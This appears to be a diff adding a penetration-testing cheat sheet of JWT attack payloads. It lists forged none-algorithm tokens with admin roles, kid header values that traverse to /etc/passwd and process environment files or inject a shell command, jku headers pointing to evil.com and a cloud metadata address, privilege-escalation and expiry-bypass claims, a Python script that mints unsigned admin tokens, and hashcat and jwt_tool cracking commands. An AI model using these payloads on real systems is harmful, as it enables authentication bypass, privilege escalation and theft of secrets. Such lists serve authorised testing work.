@@ -1,0 +1,178 @@
+================================================================================
+JSON WEB TOKEN (JWT) PAYLOADS - COMPLETE ARSENAL
+================================================================================
+
+================================================================================
+BASIC JWT STRUCTURE (For Reference)
+================================================================================
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+Header (Base64 URL): {"alg":"HS256","typ":"JWT"}
+Payload (Base64 URL): {"sub":"1234567890","name":"John Doe","iat":1516239022}
+Signature: HMAC-SHA256
+
+================================================================================
+NONE ALGORITHM ATTACK PAYLOADS
+================================================================================
+
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0. – None algorithm with admin role
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlzQWRtaW4iOnRydWV9. – None algorithm with isAdmin true
+eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJyb290Iiwicm9sZSI6InN1cGVyYWRtaW4ifQ. – Uppercase NONE algorithm
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJwYXNzd29yZCJ9. – Login bypass attempt
+
+================================================================================
+WEAK SECRET TESTING PAYLOADS (HMAC)
+================================================================================
+
+Common Secrets:
+secret, secretkey, jwtsecret, mysecret, password, 123456, admin, changeme, qwerty, letmein, welcome, monkey, dragon, master, admin123, root, toor, passw0rd, default, secret123, api, apikey, token, test, 1q2w3e4r, q1w2e3r4, 1q2w3e, zaq12wsx, hello, world, test123, pass123, guest, abcd1234, admin@123, Password1, qwerty123, 12345, 12345678, 123456789, 1234567890, 000000, abc123, 111111, 7777777, love, iloveyou, secretpassword
+
+================================================================================
+KID (KEY ID) PATH TRAVERSAL PAYLOADS
+================================================================================
+
+Header modifications:
+{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"} – Path traversal null device
+{"alg":"HS256","typ":"JWT","kid":"/etc/passwd"} – Read password file
+{"alg":"HS256","typ":"JWT","kid":"../../../proc/self/environ"} – Read environment variables
+{"alg":"HS256","typ":"JWT","kid":"../../../../../../../../../../../../etc/passwd"} – Deep traversal
+{"alg":"HS256","typ":"JWT","kid":"....//....//....//etc/passwd"} – Double dot bypass
+{"alg":"HS256","typ":"JWT","kid":"/dev/stdin"} – Read stdin
+{"alg":"HS256","typ":"JWT","kid":"file:///etc/passwd"} – File URI scheme
+{"alg":"HS256","typ":"JWT","kid":"http://evil.com/key"} – External URL
+{"alg":"HS256","typ":"JWT","kid":"https://evil.com/key"} – HTTPS external
+{"alg":"HS256","typ":"JWT","kid":"|id"} – Command injection in KID
+
+================================================================================
+ALGORITHM CONFUSION PAYLOADS (RS256/RS384/RS512 → HS256)
+================================================================================
+
+Original RS256 token header: {"alg":"RS256","typ":"JWT"}
+Modified to: {"alg":"HS256","typ":"JWT"} – Change to HS256
+Need to sign with public key (treat as HMAC secret)
+Use: `jwt_tool <token> -X k` – Algorithm confusion attack
+
+================================================================================
+JWKS INJECTION PAYLOADS (JKU Header)
+================================================================================
+
+Header with JKU:
+{"alg":"RS256","typ":"JWT","jku":"https://evil.com/jwks.json"} – External JWKS
+{"alg":"RS256","typ":"JWT","jku":"http://localhost:8000/jwks.json"} – Localhost JWKS
+{"alg":"RS256","typ":"JWT","jku":"http://169.254.169.254/jwks.json"} – Metadata JWKS
+{"alg":"RS256","typ":"JWT","jku":"http://evil.com/redirect?url=http://internal/jwks"} – Redirect chain
+
+Malicious JWKS.json content:
+{
+  "keys": [
+    {
+      "kty": "RSA",
+      "n": "public_key_modulus_in_base64",
+      "e": "AQAB",
+      "kid": "malicious",
+      "alg": "RS256"
+    }
+  ]
+}
+
+================================================================================
+JWT CLAIM INJECTION PAYLOADS (Privilege Escalation)
+================================================================================
+
+Payload modifications:
+{"sub":"admin","role":"admin"} – Set role to admin
+{"sub":"admin","is_admin":true} – Set is_admin flag
+{"sub":"root","group":"administrators"} – Set administrator group
+{"sub":"admin","permissions":["*"]} – Wildcard permissions
+{"sub":"admin","scope":"admin write read"} – OAuth scope injection
+{"sub":"admin","access_level":999} – Numeric privilege level
+{"sub":"admin","privilege":"superuser"} – Superuser privilege
+{"sub":"admin","type":"administrator"} – Administrator type
+
+================================================================================
+TIMESTAMP MANIPULATION PAYLOADS (Expiration Bypass)
+================================================================================
+
+{"exp":9999999999} – Set expiration to year 2286
+{"exp":999999999999} – Very far expiration
+{"exp":null} – Remove expiration
+{"exp":0} – Unix epoch (invalid but may be accepted)
+{"nbf":0} – Not before time (already active)
+{"nbf":-1} – Negative not-before
+{"iat":0} – Issued at epoch
+{"iat":1577836800} – IAT set to 2020-01-01 (bypass IAT checks)
+
+================================================================================
+JWT NONE ALGORITHM - GENERATION SCRIPT PAYLOADS
+================================================================================
+
+import jwt
+# Generate none algorithm token
+header = {"alg": "none", "typ": "JWT"}
+payload = {"sub": "admin", "role": "admin"}
+none_token = jwt.encode(payload, key=None, algorithm="none", headers=header)
+print(none_token)
+
+================================================================================
+JWT WEAK SECRET BRUTEFORCE COMMANDS
+================================================================================
+
+hashcat -m 16500 jwt.txt rockyou.txt – Crack HS256 token
+hashcat -m 16600 jwt.txt rockyou.txt – Crack HS384 token
+hashcat -m 16700 jwt.txt rockyou.txt – Crack HS512 token
+john jwt.txt --format=HMAC-SHA256 – John the Ripper cracking
+jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt – jwt_tool cracking
+
+================================================================================
+JWT ALGORITHM CONFUSION - TEST COMMANDS
+================================================================================
+
+jwt_tool <token> -X k – RS256/RS384/RS512 to HS256 conversion
+jwt_tool <token> -X a – None algorithm attack
+jwt_tool <token> -X t – Timestamp manipulation
+jwt_tool <token> -X i – Injection attack (KID traversal)
+jwt_tool <token> -X v – Vulnerability check
+
+================================================================================
+JWT TOOL COMMANDS (Complete)
+================================================================================
+
+jwt_tool <token> – Decode token
+jwt_tool <token> -T – Show token claims
+jwt_tool <token> -X a – None algorithm attack
+jwt_tool <token> -X k – Algorithm confusion attack
+jwt_tool <token> -X t – Timestamp manipulation
+jwt_tool <token> -X i – Injection (KID path traversal)
+jwt_tool <token> -X j – JWKS injection
+jwt_tool <token> -X c – Claim injection
+jwt_tool <token> -I -hc kid -hv "../../../dev/null" – Change KID to path traversal
+jwt_tool <token> -I -hc jku -hv "http://evil.com/jwks.json" – Change JKU to malicious
+
+================================================================================
+JWT RESPONSE INDICATORS (What to Look For)
+================================================================================
+
+invalid signature – Signature mismatch
+algorithm not allowed – Alg none may be blocked
+invalid token – Malformed token
+token expired – Expiration enforced
+jwt malformed – JWT format error
+Invalid JWT – Generic error
+Unauthorized – Auth failed but structure accepted
+Forbidden – Auth passed but insufficient privileges
+
+================================================================================
+REAL-WORLD JWT VULNERABILITY PAYLOADS (Notable CVEs)
+================================================================================
+
+{"alg":"none","typ":"JWT"} – CVE-2015-9235 (none algorithm bypass)
+{"kid":"../../../../dev/null"} – CVE-2017-11424 (KID traversal)
+RS256→HS256 – CVE-2016-10555 (algorithm confusion)
+jku header injection – CVE-2018-0114 (JKU injection)
+CVE-2022-21449 – Psychic signatures (ECDSA (0,0) bypass)
+Log4Shell + JWT – JWT header injection via Log4j
+
+================================================================================
+END OF JWT PAYLOADS
+================================================================================
